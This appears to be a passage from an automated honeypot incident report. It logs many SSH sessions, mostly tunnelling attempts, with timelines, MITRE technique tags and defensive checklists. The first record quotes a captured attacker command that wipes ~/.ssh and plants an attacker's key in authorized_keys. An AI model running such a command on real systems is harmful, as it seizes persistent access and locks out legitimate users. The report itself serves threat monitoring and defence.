| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 07:59:22` | `cowrie.session.connect` |
| `2026-07-28 07:59:22` | `cowrie.client.version` |
| `2026-07-28 07:59:22` | `cowrie.client.kex` |
| `2026-07-28 07:59:23` | `cowrie.login.success` |
| `2026-07-28 07:59:24` | `cowrie.session.params` |
| `2026-07-28 07:59:24` | `cowrie.command.input` |
| `2026-07-28 07:59:24` | `cowrie.command.failed` |
| `2026-07-28 07:59:24` | `cowrie.log.closed` |
| `2026-07-28 07:59:25` | `cowrie.session.params` |
| `2026-07-28 07:59:25` | `cowrie.command.input` |
| `2026-07-28 07:59:25` | `cowrie.session.file_download` |
| `2026-07-28 07:59:25` | `cowrie.log.closed` |
| `2026-07-28 07:59:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.229.125[.]106` to AbuseIPDB if not already reported
- [ ] Block `103.229.125[.]106` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5d174dadcb6

| Field | Detail |
|---|---|
| **Source IP** | `103.229.125[.]106` |
| **First Seen** | 2026-07-28 07:59 |
| **Last Seen** | 2026-07-28 07:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 07:59:25` | `cowrie.session.connect` |
| `2026-07-28 07:59:25` | `cowrie.client.version` |
| `2026-07-28 07:59:26` | `cowrie.client.kex` |
| `2026-07-28 07:59:26` | `cowrie.login.success` |
| `2026-07-28 07:59:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.229.125[.]106` to AbuseIPDB if not already reported
- [ ] Block `103.229.125[.]106` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d2f44c76ea02

| Field | Detail |
|---|---|
| **Source IP** | `103.229.125[.]106` |
| **First Seen** | 2026-07-28 07:59 |
| **Last Seen** | 2026-07-28 07:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 07:59:27` | `cowrie.session.connect` |
| `2026-07-28 07:59:27` | `cowrie.client.version` |
| `2026-07-28 07:59:27` | `cowrie.client.kex` |
| `2026-07-28 07:59:27` | `cowrie.login.success` |
| `2026-07-28 07:59:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.229.125[.]106` to AbuseIPDB if not already reported
- [ ] Block `103.229.125[.]106` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b96cd9bf8e79

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-28 08:00 |
| **Last Seen** | 2026-07-28 08:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 08:00:39` | `cowrie.session.connect` |
| `2026-07-28 08:00:39` | `cowrie.client.version` |
| `2026-07-28 08:00:40` | `cowrie.client.kex` |
| `2026-07-28 08:00:40` | `cowrie.login.success` |
| `2026-07-28 08:00:40` | `cowrie.direct-tcpip.request` |
| `2026-07-28 08:00:40` | `cowrie.direct-tcpip.data` |
| `2026-07-28 08:00:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-582fead59555

| Field | Detail |
|---|---|
| **Source IP** | `211.247.127[.]250` |
| **First Seen** | 2026-07-28 08:01 |
| **Last Seen** | 2026-07-28 08:01 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 08:01:26` | `cowrie.session.connect` |
| `2026-07-28 08:01:27` | `cowrie.client.version` |
| `2026-07-28 08:01:27` | `cowrie.client.kex` |
| `2026-07-28 08:01:29` | `cowrie.login.success` |
| `2026-07-28 08:01:30` | `cowrie.direct-tcpip.request` |
| `2026-07-28 08:01:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.247.127[.]250` to AbuseIPDB if not already reported
- [ ] Block `211.247.127[.]250` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-162edb29a120

| Field | Detail |
|---|---|
| **Source IP** | `123.212.9[.]122` |
| **First Seen** | 2026-07-28 08:01 |
| **Last Seen** | 2026-07-28 08:01 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 08:01:35` | `cowrie.session.connect` |
| `2026-07-28 08:01:36` | `cowrie.client.version` |
| `2026-07-28 08:01:36` | `cowrie.client.kex` |
| `2026-07-28 08:01:38` | `cowrie.login.success` |
| `2026-07-28 08:01:39` | `cowrie.direct-tcpip.request` |
| `2026-07-28 08:01:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `123.212.9[.]122` to AbuseIPDB if not already reported
- [ ] Block `123.212.9[.]122` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-828fe70d2d7b

| Field | Detail |
|---|---|
| **Source IP** | `177.135.206[.]10` |
| **First Seen** | 2026-07-28 08:14 |
| **Last Seen** | 2026-07-28 08:14 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 08:14:38` | `cowrie.session.connect` |
| `2026-07-28 08:14:38` | `cowrie.client.version` |
| `2026-07-28 08:14:38` | `cowrie.client.kex` |
| `2026-07-28 08:14:40` | `cowrie.login.success` |
| `2026-07-28 08:14:40` | `cowrie.direct-tcpip.request` |
| `2026-07-28 08:14:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.135.206[.]10` to AbuseIPDB if not already reported
- [ ] Block `177.135.206[.]10` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-227a5b444588

| Field | Detail |
|---|---|
| **Source IP** | `50.217.40[.]11` |
| **First Seen** | 2026-07-28 08:14 |
| **Last Seen** | 2026-07-28 08:14 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 08:14:45` | `cowrie.session.connect` |
| `2026-07-28 08:14:46` | `cowrie.client.version` |
| `2026-07-28 08:14:46` | `cowrie.client.kex` |
| `2026-07-28 08:14:47` | `cowrie.login.success` |
| `2026-07-28 08:14:47` | `cowrie.direct-tcpip.request` |
| `2026-07-28 08:14:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.217.40[.]11` to AbuseIPDB if not already reported
- [ ] Block `50.217.40[.]11` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-84f1f9dc975f

| Field | Detail |
|---|---|
| **Source IP** | `117.70.94[.]155` |
| **First Seen** | 2026-07-28 08:17 |
| **Last Seen** | 2026-07-28 08:17 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 08:17:00` | `cowrie.session.connect` |
| `2026-07-28 08:17:03` | `cowrie.client.version` |
| `2026-07-28 08:17:03` | `cowrie.client.kex` |
| `2026-07-28 08:17:06` | `cowrie.login.success` |
| `2026-07-28 08:17:06` | `cowrie.direct-tcpip.request` |
| `2026-07-28 08:17:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.70.94[.]155` to AbuseIPDB if not already reported
- [ ] Block `117.70.94[.]155` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-089f53fed29e

| Field | Detail |
|---|---|
| **Source IP** | `203.192.211[.]180` |
| **First Seen** | 2026-07-28 08:17 |
| **Last Seen** | 2026-07-28 08:17 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 08:17:12` | `cowrie.session.connect` |
| `2026-07-28 08:17:12` | `cowrie.client.version` |
| `2026-07-28 08:17:12` | `cowrie.client.kex` |
| `2026-07-28 08:17:14` | `cowrie.login.success` |
| `2026-07-28 08:17:15` | `cowrie.direct-tcpip.request` |
| `2026-07-28 08:17:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.192.211[.]180` to AbuseIPDB if not already reported
- [ ] Block `203.192.211[.]180` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-43868062e690

| Field | Detail |
|---|---|
| **Source IP** | `220.189.209[.]18` |
| **First Seen** | 2026-07-28 08:26 |
| **Last Seen** | 2026-07-28 08:26 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 08:26:07` | `cowrie.session.connect` |
| `2026-07-28 08:26:08` | `cowrie.client.version` |
| `2026-07-28 08:26:08` | `cowrie.client.kex` |
| `2026-07-28 08:26:11` | `cowrie.login.success` |
| `2026-07-28 08:26:12` | `cowrie.direct-tcpip.request` |
| `2026-07-28 08:26:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.189.209[.]18` to AbuseIPDB if not already reported
- [ ] Block `220.189.209[.]18` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0be8362b804a

| Field | Detail |
|---|---|
| **Source IP** | `196.203.231[.]220` |
| **First Seen** | 2026-07-28 08:26 |
| **Last Seen** | 2026-07-28 08:26 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 08:26:17` | `cowrie.session.connect` |
| `2026-07-28 08:26:17` | `cowrie.client.version` |
| `2026-07-28 08:26:17` | `cowrie.client.kex` |
| `2026-07-28 08:26:18` | `cowrie.login.success` |
| `2026-07-28 08:26:18` | `cowrie.direct-tcpip.request` |
| `2026-07-28 08:26:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.203.231[.]220` to AbuseIPDB if not already reported
- [ ] Block `196.203.231[.]220` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03a794519b39

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-28 08:27 |
| **Last Seen** | 2026-07-28 08:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 08:27:41` | `cowrie.session.connect` |
| `2026-07-28 08:27:41` | `cowrie.client.version` |
| `2026-07-28 08:27:42` | `cowrie.client.kex` |
| `2026-07-28 08:27:42` | `cowrie.login.success` |
| `2026-07-28 08:27:42` | `cowrie.direct-tcpip.request` |
| `2026-07-28 08:27:42` | `cowrie.direct-tcpip.data` |
| `2026-07-28 08:27:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f3dbb6022a62

| Field | Detail |
|---|---|
| **Source IP** | `47.121.138[.]211` |
| **First Seen** | 2026-07-28 08:30 |
| **Last Seen** | 2026-07-28 08:30 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 08:30:17` | `cowrie.session.connect` |
| `2026-07-28 08:30:17` | `cowrie.client.version` |
| `2026-07-28 08:30:18` | `cowrie.client.kex` |
| `2026-07-28 08:30:19` | `cowrie.login.success` |
| `2026-07-28 08:30:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.121.138[.]211` to AbuseIPDB if not already reported
- [ ] Block `47.121.138[.]211` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-665b4e2fd3cf

| Field | Detail |
|---|---|
| **Source IP** | `47.250.92[.]207` |
| **First Seen** | 2026-07-28 08:34 |
| **Last Seen** | 2026-07-28 08:34 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: curl/7.64.1, Accept: */*` |
| **TTPs (MITRE)** | T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 08:34:20` | `cowrie.session.connect` |
| `2026-07-28 08:34:20` | `cowrie.login.success` |
| `2026-07-28 08:34:21` | `cowrie.session.params` |
| `2026-07-28 08:34:21` | `cowrie.command.input` |
| `2026-07-28 08:34:21` | `cowrie.command.failed` |
| `2026-07-28 08:34:21` | `cowrie.command.input` |
| `2026-07-28 08:34:21` | `cowrie.command.failed` |
| `2026-07-28 08:34:21` | `cowrie.command.input` |
| `2026-07-28 08:34:23` | `cowrie.log.closed` |
| `2026-07-28 08:34:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.250.92[.]207` to AbuseIPDB if not already reported
- [ ] Block `47.250.92[.]207` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-69e5c14cbd47

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-28 08:34 |
| **Last Seen** | 2026-07-28 08:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 08:34:40` | `cowrie.session.connect` |
| `2026-07-28 08:34:40` | `cowrie.client.version` |
| `2026-07-28 08:34:40` | `cowrie.client.kex` |
| `2026-07-28 08:34:41` | `cowrie.login.success` |
| `2026-07-28 08:34:41` | `cowrie.direct-tcpip.request` |
| `2026-07-28 08:34:41` | `cowrie.direct-tcpip.data` |
| `2026-07-28 08:34:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d33c8f981c16

| Field | Detail |
|---|---|
| **Source IP** | `178.214.160[.]4` |
| **First Seen** | 2026-07-28 08:38 |
| **Last Seen** | 2026-07-28 08:38 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 08:38:13` | `cowrie.session.connect` |
| `2026-07-28 08:38:13` | `cowrie.client.version` |
| `2026-07-28 08:38:13` | `cowrie.client.kex` |
| `2026-07-28 08:38:14` | `cowrie.login.success` |
| `2026-07-28 08:38:15` | `cowrie.direct-tcpip.request` |
| `2026-07-28 08:38:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.214.160[.]4` to AbuseIPDB if not already reported
- [ ] Block `178.214.160[.]4` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7f56aa8c940

| Field | Detail |
|---|---|
| **Source IP** | `122.176.21[.]104` |
| **First Seen** | 2026-07-28 08:39 |
| **Last Seen** | 2026-07-28 08:39 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 08:39:10` | `cowrie.session.connect` |
| `2026-07-28 08:39:11` | `cowrie.client.version` |
| `2026-07-28 08:39:11` | `cowrie.client.kex` |
| `2026-07-28 08:39:13` | `cowrie.login.success` |
| `2026-07-28 08:39:14` | `cowrie.direct-tcpip.request` |
| `2026-07-28 08:39:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.176.21[.]104` to AbuseIPDB if not already reported
- [ ] Block `122.176.21[.]104` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d5f35862989

| Field | Detail |
|---|---|
| **Source IP** | `65.20.149[.]239` |
| **First Seen** | 2026-07-28 08:39 |
| **Last Seen** | 2026-07-28 08:39 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 08:39:23` | `cowrie.session.connect` |
| `2026-07-28 08:39:23` | `cowrie.client.version` |
| `2026-07-28 08:39:23` | `cowrie.client.kex` |
| `2026-07-28 08:39:25` | `cowrie.login.success` |
| `2026-07-28 08:39:25` | `cowrie.direct-tcpip.request` |
| `2026-07-28 08:39:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.149[.]239` to AbuseIPDB if not already reported
- [ ] Block `65.20.149[.]239` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e2bbe774fd9

| Field | Detail |
|---|---|
| **Source IP** | `200.106.49[.]149` |
| **First Seen** | 2026-07-28 08:41 |
| **Last Seen** | 2026-07-28 08:41 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 08:41:37` | `cowrie.session.connect` |
| `2026-07-28 08:41:38` | `cowrie.client.version` |
| `2026-07-28 08:41:38` | `cowrie.client.kex` |
| `2026-07-28 08:41:39` | `cowrie.login.success` |
| `2026-07-28 08:41:39` | `cowrie.direct-tcpip.request` |
| `2026-07-28 08:41:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.106.49[.]149` to AbuseIPDB if not already reported
- [ ] Block `200.106.49[.]149` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a112b20c850d

| Field | Detail |
|---|---|
| **Source IP** | `200.232.114[.]71` |
| **First Seen** | 2026-07-28 08:47 |
| **Last Seen** | 2026-07-28 08:47 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 08:47:11` | `cowrie.session.connect` |
| `2026-07-28 08:47:12` | `cowrie.client.version` |
| `2026-07-28 08:47:12` | `cowrie.client.kex` |
| `2026-07-28 08:47:13` | `cowrie.login.success` |
| `2026-07-28 08:47:14` | `cowrie.direct-tcpip.request` |
| `2026-07-28 08:47:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.232.114[.]71` to AbuseIPDB if not already reported
- [ ] Block `200.232.114[.]71` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48335977be07

| Field | Detail |
|---|---|
| **Source IP** | `200.106.49[.]149` |
| **First Seen** | 2026-07-28 08:47 |
| **Last Seen** | 2026-07-28 08:47 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 08:47:19` | `cowrie.session.connect` |
| `2026-07-28 08:47:19` | `cowrie.client.version` |
| `2026-07-28 08:47:19` | `cowrie.client.kex` |
| `2026-07-28 08:47:21` | `cowrie.login.success` |
| `2026-07-28 08:47:21` | `cowrie.direct-tcpip.request` |
| `2026-07-28 08:47:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.106.49[.]149` to AbuseIPDB if not already reported
- [ ] Block `200.106.49[.]149` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-abf85a8251d7

| Field | Detail |
|---|---|
| **Source IP** | `169.211.232[.]182` |
| **First Seen** | 2026-07-28 08:50 |
| **Last Seen** | 2026-07-28 08:50 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 08:50:27` | `cowrie.session.connect` |
| `2026-07-28 08:50:28` | `cowrie.client.version` |
| `2026-07-28 08:50:28` | `cowrie.client.kex` |
| `2026-07-28 08:50:30` | `cowrie.login.success` |
| `2026-07-28 08:50:31` | `cowrie.direct-tcpip.request` |
| `2026-07-28 08:50:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `169.211.232[.]182` to AbuseIPDB if not already reported
- [ ] Block `169.211.232[.]182` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5bca2549b82a

| Field | Detail |
|---|---|
| **Source IP** | `122.160.103[.]228` |
| **First Seen** | 2026-07-28 08:50 |
| **Last Seen** | 2026-07-28 08:50 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 08:50:40` | `cowrie.session.connect` |
| `2026-07-28 08:50:41` | `cowrie.client.version` |
| `2026-07-28 08:50:41` | `cowrie.client.kex` |
| `2026-07-28 08:50:43` | `cowrie.login.success` |
| `2026-07-28 08:50:43` | `cowrie.direct-tcpip.request` |
| `2026-07-28 08:50:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.160.103[.]228` to AbuseIPDB if not already reported
- [ ] Block `122.160.103[.]228` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a8dad24f4268

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-28 08:52 |
| **Last Seen** | 2026-07-28 08:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 08:52:17` | `cowrie.session.connect` |
| `2026-07-28 08:52:17` | `cowrie.client.version` |
| `2026-07-28 08:52:17` | `cowrie.client.kex` |
| `2026-07-28 08:52:18` | `cowrie.login.success` |
| `2026-07-28 08:52:18` | `cowrie.direct-tcpip.request` |
| `2026-07-28 08:52:18` | `cowrie.direct-tcpip.data` |
| `2026-07-28 08:52:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
